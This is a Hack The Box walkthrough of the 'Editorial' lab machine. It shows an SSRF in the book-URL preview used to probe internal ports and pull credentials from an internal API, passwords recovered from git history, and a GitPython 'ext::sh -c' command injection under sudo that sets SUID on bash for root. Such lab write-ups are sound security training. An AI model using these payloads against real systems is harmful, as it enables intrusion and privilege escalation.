# HTB - Editorial

#### Ip: 10.129.130.1
#### Name: Editorial
#### Rating: Easy

------------------------------------------------

Editorial.png

#### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 5000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Editorial]
└─$ sudo nmap -p- --min-rate 5000 -sC -sV 10.129.166.106
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-05 09:10 CST
Nmap scan report for 10.129.166.106
Host is up (0.089s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0dedb29ce253fbd4c8c1196e7580d864 (ECDSA)
|_  256 0fb9a7510e00d57b5b7c5fbf2bed53a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.02 seconds
```

Let's add editorial.htb to `/etc/hosts`.

Looking at the site it appears to be a publishing company, with an upload form to "Publish With Us":

htb_editorial_publish.png

Trying to submit a test request we get the message:

```
✍️ Request Submited! 🔖 We'll reach your book. Let us read and explore your idea and soon you will have news 📚
```

Trying this again and capturing the request in Burp, curiously the most interesting parts of the upload form, the book URL and the cover image are absent:

htb_editorial_burp.png

However we can set up a nc listener and point the bookurl back to our machine, and rather than hitting "submit" we can click "preview" which gets us a hit back:

```
┌──(ryan㉿kali)-[~/HTB/Editorial]
└─$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [10.10.14.114] from (UNKNOWN) [10.129.166.106] 55902
GET / HTTP/1.1
Host: 10.10.14.114:8000
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

Let's capture this in Burp again, but this time use localhost on port 22 as the bookurl:

htb_editorial_burp2.png

We are given an image link, and note the response size of 61.

Looking at the page source we know this to be the src image:

htb_editorial_html.png

Lets grab a list of common HTTP ports from SecLists: https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Infrastructure/common-http-ports.txt

and use these with Burp Intruder to see if there are any internal ports open on the target:

htb_editorial_intruder.png

Cool, we've got a different response size from port 5000, which makes me wonder if this is open internally.

### Exploitation

Sending this request we receive a new link:

htb_editorial_burp3.png

But trying to visit the link in the browser gives us a 404:

htb_editorial_404.png

Strangely, re-sending the request and generating a new link works this time, and I can use curl to access the response:

```
┌──(ryan㉿kali)-[~/HTB/Editorial]
└─$ curl http://editorial.htb/static/uploads/b6b7b8fc-2762-42ba-9838-37385d77dddc
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```

So looks like this is an API with several different endpoints.

Trying them each out by entering them into the URL field, pressing enter, and then opening the new 'image' in a new tab prompts the download of each file:

`http://127.0.0.1:5000/api/latest/metadata/messages/authors` proved to be the most interesting:

htb_editorial_image.png

```
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

Cool, we've discovered the credentials: `dev:dev080217_devAPI!@`

We can use these to SSH into the target:

```
┌──(ryan㉿kali)-[~/HTB/Editorial]
└─$ ssh dev@10.129.166.106 
```

And grab the user.txt flag:

htb_editorial_user.png

### Privilege Escalation

In this directory we find an `apps` folder that contains `.git`.

```
dev@editorial:~/apps$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
drwxr-x--- 4 dev dev 4096 Mar  5 17:40 ..
drwxr-xr-x 8 dev dev 4096 Jun  5  2024 .git
```

Let's run `git log` to view the various commits.

The note: `downgrading prod to dev` seems interesting, so let's grab this commit, along with the one just before it, and use `git diff` with the commit numbers to see what's changed:

htb_editorial_log.png

Cool, we found another password, one seemingly powerful enough to be used in production:

htb_editorial_diff.png

`080217_Producti0n_2023!@`

Let's use this to switch users to user prod:

```
dev@editorial:~/apps$ whoami
dev
dev@editorial:~/apps$ cd /home
dev@editorial:/home$ ls
dev  prod
dev@editorial:/home$ cd prod
-bash: cd: prod: Permission denied
dev@editorial:/home$ su prod
Password: 
prod@editorial:/home$ whoami
prod
```

We can now run `sudo -l` to see what user prod can run with elevated permissions:

```
prod@editorial:/home$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

Wildcards being used with `sudo` are almost always interesting.

Looking at the script:

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Looking into GitPython vulnerabilities I find: https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858

We can test for this using:

```
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/testing'
```

Which works and creates a file in `/tmp` called testing:

```
prod@editorial:/opt/internal_apps/clone_changes$ ls -la /tmp/testing
-rw-r--r-- 1 root root 0 Mar  5 19:29 /tmp/testing
```

Let's abuse this for a root shell by setting the SUID on Bash:

```
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /bin/chmod% 4755% /bin/bash'
```

We can then run:

```
prod@editorial:/opt/internal_apps/clone_changes$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# hostname
editorial
```

And grab the final flag:

htb_editorial_root.png

Thanks for following along!

-Ryan

-------------------------------------------